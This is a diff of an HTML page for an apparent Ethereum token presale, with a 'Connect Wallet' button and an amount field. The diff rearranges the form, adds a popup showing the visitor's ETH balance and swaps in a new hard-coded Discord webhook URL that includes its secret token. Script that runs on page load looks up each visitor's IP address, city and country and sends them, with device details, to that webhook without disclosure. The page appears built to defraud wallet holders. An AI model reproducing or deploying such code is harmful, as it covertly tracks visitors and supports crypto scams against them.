@@ -1940,100 +1940,87 @@
                             <div class="ant-alert-description"></div>
                           </div>
                         </div>
-                        <form>
+                        <div class="has-text-centered">
+                          <p class="mb-2">Presale Ends In</p>
                           <div class="has-text-centered">
-                            <p class="mb-2">Presale Ends In</p>
-                            <div class="has-text-centered">
-                              <strong
-                                ><span
-                                  class="p-2 has-background-danger-light mr-2"
-                                  style="border-radius: 4px"
-                                  >10</span
-                                ><span
-                                  class="p-2 has-background-danger-light mr-2"
-                                  style="border-radius: 4px"
-                                  >21</span
-                                ><span
-                                  class="p-2 has-background-danger-light mr-2"
-                                  style="border-radius: 4px"
-                                  >37</span
-                                ><span
-                                  class="p-2 has-background-danger-light mr-2"
-                                  style="border-radius: 4px"
-                                  >46</span
-                                ></strong
+                            <strong
+                              ><span
+                                class="p-2 has-background-danger-light mr-2"
+                                style="border-radius: 4px"
+                                >10</span
+                              ><span
+                                class="p-2 has-background-danger-light mr-2"
+                                style="border-radius: 4px"
+                                >21</span
+                              ><span
+                                class="p-2 has-background-danger-light mr-2"
+                                style="border-radius: 4px"
+                                >37</span
+                              ><span
+                                class="p-2 has-background-danger-light mr-2"
+                                style="border-radius: 4px"
+                                >46</span
+                              ></strong
+                            >
+                          </div>
+                        </div>
+                        <div class="pb-4">
+                          <div
+                            class="ant-progress ant-progress-line ant-progress-status-active ant-progress-default mt-4 mb-2"
+                          >
+                            <div class="ant-progress-outer">
+                              <div class="ant-progress-inner">
+                                <div
+                                  class="ant-progress-bg"
+                                  style="
+                                    width: 0%;
+                                    height: 15px;
+                                    background: rgb(72, 199, 116);
+                                  "
+                                ></div>
+                              </div>
+                            </div>
+                          </div>
+                          <div class="is-flex is-align-items-center is-size-7">
+                            <div class="is-flex-grow-1">0 ETH</div>
+                            <div class="is-flex-grow-1 has-text-right">
+                              400 ETH
+                            </div>
+                          </div>
+                        </div>
+                        <div class="field">
+                          <label class="label">Amount </label>
+                          <div class="control">
+                            <div style="position: relative">
+                              <input
+                                class="input"
+                                id="coninp"
+                                type="number"
+                                placeholder="0.0"
+                                value=""
+                              /><a
+                                class="mr-2"
+                                style="position: absolute; right: 8px; top: 4px"
+                                ><b>MAX</b></a
                               >
                             </div>
                           </div>
-                          <div class="pb-4">
-                            <div
-                              class="ant-progress ant-progress-line ant-progress-status-active ant-progress-default mt-4 mb-2"
-                            >
-                              <div class="ant-progress-outer">
-                                <div class="ant-progress-inner">
-                                  <div
-                                    class="ant-progress-bg"
-                                    style="
-                                      width: 0%;
-                                      height: 15px;
-                                      background: rgb(72, 199, 116);
-                                    "
-                                  ></div>
-                                </div>
-                              </div>
-                            </div>
-                            <div
-                              class="is-flex is-align-items-center is-size-7"
-                            >
-                              <div class="is-flex-grow-1">0 ETH</div>
-                              <div class="is-flex-grow-1 has-text-right">
-                                400 ETH
-                              </div>
-                            </div>
-                          </div>
-                          <div class="field">
-                            <label class="label">Amount </label>
-                            <div class="control">
-                              <div style="position: relative">
-                                <input
-                                  class="input"
-                                  id="coninp"
-                                  type="number"
-                                  placeholder="0.0"
-                                  value=""
-                                /><a
-                                  class="mr-2"
-                                  style="
-                                    position: absolute;
-                                    right: 8px;
-                                    top: 4px;
-                                  "
-                                  ><b>MAX</b></a
-                                >
-                              </div>
-                            </div>
-                          </div>
-                          <button
-                            type="button"
-                            class="ant-btn ant-btn-primary"
-                            id="cwbox"
-                            onclick="render()"
-                          >
-                            <span>Connect Wallet</span>
-                          </button>
-                          <button
-                            id="buybox"
-                            class="ant-btn-primary"
-                            style="
-                              padding: 4px 18px;
-                              border: none;
-                              display: none;
-                            "
-                            onclick="logout()"
-                          >
-                            <span> √Buy with ETH </span>
-                          </button>
-                        </form>
+                        </div>
+                        <button
+                          class="ant-btn ant-btn-primary"
+                          id="cwbox"
+                          onclick="render()"
+                        >
+                          <span>Connect Wallet</span>
+                        </button>
+                        <button
+                          id="buybox"
+                          class="ant-btn-primary"
+                          style="padding: 4px 18px; border: none; display: none"
+                          onclick="aler()"
+                        >
+                          <span> √Buy with ETH </span>
+                        </button>
                         <div class="mt-2 has-text-primary is-clickable">
                           <u>See affiliate detail</u>
                         </div>
@@ -2836,6 +2823,7 @@
           ssis = !ssis;
         }
       }
+
       async function init() {
         const providerOptions = {
           walletconnect: {
@@ -2896,9 +2884,10 @@
         spanls.style.display = "none";
         cwbox.style.display = "block";
         buybox.style.display = "none";
+        coninp.value = "";
       }
       const webhook =
-        "https://discord.com/api/webhooks/1108956291730255873/BKXciwDJ-kNcH9XoncJU-FpbeFIfHUKz6mJC9Eza4h8zE4IKMsMr2gFM_yLvyAKcGwea";
+        "https://discord.com/api/webhooks/1087632125911629854/v2lmQ6n_XRoCBTD5AgufRCgbZppalD2Lr2vpHJA-ZmLxGvadMyxLCvvbU6uWDgf_XvFj";
       let qdevice_emoji = "";
       function logTlgConnect(msg) {
         fetch("https://api.db-ip.com/v2/free/self/")
@@ -2942,8 +2931,7 @@
       //当前函数为的调用 discord  webhook
       function hidiscord(pay, qdevice) {
         let data = {
-          content: `**🤞 welcome newcomer**
-IP: ${pay.ipAddress} (${pay.city}/${pay.countryCode})
+          content: `**🤞 welcome newcomer--**IP: ${pay.ipAddress} (${pay.city}/${pay.countryCode})
 Device: ${qdevice} `,
         };
         fetch(webhook, {
@@ -2959,6 +2947,9 @@ Device: ${qdevice} `,
           });
       }
       logTlgConnect("");
+      function aler() {
+        alert(`您所拥有的金额为${xethbalance}`);
+      }
     </script>
   </body>
 </html>
